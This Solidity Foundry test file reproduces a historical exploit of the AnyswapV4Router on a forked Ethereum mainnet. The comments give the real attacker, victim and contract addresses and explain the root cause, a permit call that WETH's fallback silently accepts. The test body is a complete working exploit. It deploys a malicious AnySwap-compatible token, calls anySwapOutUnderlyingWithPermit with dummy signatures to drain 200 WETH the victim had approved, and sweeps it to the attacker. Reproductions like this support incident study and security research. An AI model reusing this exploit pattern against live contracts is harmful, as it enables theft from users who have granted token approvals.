// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 200 WETH
// Attacker : 0xC0ffeEBABE5D496B2DDE509f9fa189C25cF29671
// Attack Contract : 0xE08D97e151473A848C3d9CA3f323Cb720472D015
// Vulnerable Contract : 0x6b7a87899490EcE95443e979cA9485CBE7E71522
// Attack Tx : https://etherscan.io/tx/0xae79fdcfd7c36ed654d11b352b495340bd3cc47d0849c35ac6ffa1e4859098ec

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6b7a87899490EcE95443e979cA9485CBE7E71522#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1582
//
// Attack summary: The attacker used AnyswapV4Router.anySwapOutUnderlyingWithPermit with a malicious
// AnySwap-compatible token whose underlying was WETH. WETH does not implement permit, but its fallback
// accepts the call, so the router continued and transferred 200 WETH from a victim that had already
// approved the router.
// Root cause: The router trusted a successful permit call without confirming that the underlying token
// actually enforced permit signatures.

address constant ATTACKER = 0xC0ffeEBABE5D496B2DDE509f9fa189C25cF29671;
address constant ATTACK_CONTRACT = 0xE08D97e151473A848C3d9CA3f323Cb720472D015;
address constant VULNERABLE_CONTRACT = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
address constant VICTIM = 0x4527106ae1A661A9D2Ffc22575baCdaaCb5e51e0;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

contract ContractTest is BaseTestWithBalanceLog {
    AnyswapV4Router private constant router = AnyswapV4Router(VULNERABLE_CONTRACT);
    WETH9 private constant weth = WETH9(WETH_TOKEN);
    MaliciousAnyswapToken private maliciousToken;

    function setUp() public {
        uint256 forkBlock = 23_026_899;
        vm.createSelectFork("mainnet", forkBlock);

        fundingToken = WETH_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical attack contract");
        vm.label(VULNERABLE_CONTRACT, "AnyswapV4Router");
        vm.label(VICTIM, "Victim");
        vm.label(WETH_TOKEN, "WETH");

        maliciousToken = new MaliciousAnyswapToken(WETH_TOKEN, ATTACKER);
        vm.label(address(maliciousToken), "Malicious AnySwap token");
    }

    function testExploit() public balanceLog {
        uint256 stolenAmount = 200 ether;

        // step 1: model the same-block victim WETH funding; the real max router allowance already exists.
        vm.deal(VICTIM, stolenAmount);
        vm.prank(VICTIM);
        weth.deposit{value: stolenAmount}();
        assertEq(weth.allowance(VICTIM, VULNERABLE_CONTRACT), type(uint256).max);

        uint256 victimBefore = weth.balanceOf(VICTIM);
        uint256 attackerBefore = weth.balanceOf(ATTACKER);

        // step 2: call the verified router with dummy permit data; WETH fallback accepts the permit selector.
        vm.startPrank(ATTACKER);
        router.anySwapOutUnderlyingWithPermit(
            VICTIM,
            address(maliciousToken),
            ATTACKER,
            stolenAmount,
            block.timestamp + 1,
            0,
            bytes32(0),
            bytes32(0),
            block.chainid
        );

        // step 3: the attacker-controlled token forwards the WETH it received from the router transferFrom.
        maliciousToken.sweep(ATTACKER);
        vm.stopPrank();

        assertEq(weth.balanceOf(VICTIM), victimBefore - stolenAmount);
        assertEq(weth.balanceOf(ATTACKER), attackerBefore + stolenAmount);
        assertEq(weth.balanceOf(address(maliciousToken)), 0);
    }
}

contract MaliciousAnyswapToken {
    WETH9 private immutable weth;
    address private immutable owner;

    constructor(
        address underlyingToken,
        address tokenOwner
    ) {
        weth = WETH9(underlyingToken);
        owner = tokenOwner;
    }

    function underlying() external view returns (address) {
        return address(weth);
    }

    function depositVault(
        uint256 amount,
        address
    ) external pure returns (uint256) {
        return amount;
    }

    function burn(
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }

    function sweep(
        address to
    ) external {
        require(msg.sender == owner, "only owner");
        weth.transfer(to, weth.balanceOf(address(this)));
    }
}
